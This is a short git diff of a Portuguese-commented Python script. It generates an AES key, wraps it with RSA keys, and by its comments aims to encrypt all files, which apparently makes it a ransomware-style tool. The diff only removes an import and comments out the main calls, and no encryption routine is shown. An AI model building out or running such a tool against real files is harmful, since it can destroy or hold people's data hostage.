@@ -8,7 +8,6 @@ import socket
 from random import choice
 import multiprocessing
 
-from gera_chaves_RSA import *
 from criptografa_descriptografa_arquivo_AES import *
 from rsa import *
 from desc_rsa import *
@@ -111,12 +110,13 @@ def gera_chave_AES():
 
 # MAIN
 AES_key=gera_chave_AES()
-print('[*] chave AES gerada')
+#print('[*] chave AES gerada')
 #menu() # -> criptografa tudo
-RSA_to_AES()
-#AES_to_RSA()
-print('[*] chave AES criptografado com RSA keys')
 
+#AES_to_RSA()
+#print('[*] chave AES criptografado com RSA keys')
+
+#RSA_to_AES()
 
     # criptografa todos os arquivos com AES
 
